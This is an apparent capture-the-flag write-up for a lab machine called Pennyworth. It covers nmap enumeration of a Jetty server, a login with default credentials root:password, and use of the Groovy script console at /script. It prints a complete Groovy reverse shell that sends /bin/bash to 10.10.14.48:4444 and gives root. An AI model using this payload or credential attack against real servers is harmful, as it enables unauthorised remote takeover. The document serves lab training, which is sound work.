# Pennyworth

## Enumeration

### nmap
```
PORT      STATE    SERVICE       REASON      VERSION
2035/tcp  filtered imsldoc       no-response
2126/tcp  filtered pktcable-cops no-response
2381/tcp  filtered compaq-https  no-response
3689/tcp  filtered rendezvous    no-response
5087/tcp  filtered biotic        no-response
5810/tcp  filtered unknown       no-response
8080/tcp  open     http          syn-ack     Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
8873/tcp  filtered dxspider      no-response
9071/tcp  filtered unknown       no-response
18988/tcp filtered unknown       no-response
```
login as `root:password` (mostly bruteforce)

you can run groovy scripts at `/script` dir


Google "groovy reverse shell" if you are not used to groovy scripts

payload all the things got that too

here is mine :)

```
String host="10.10.14.48";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

on your netcat listener you get root directly so just go grab the flag


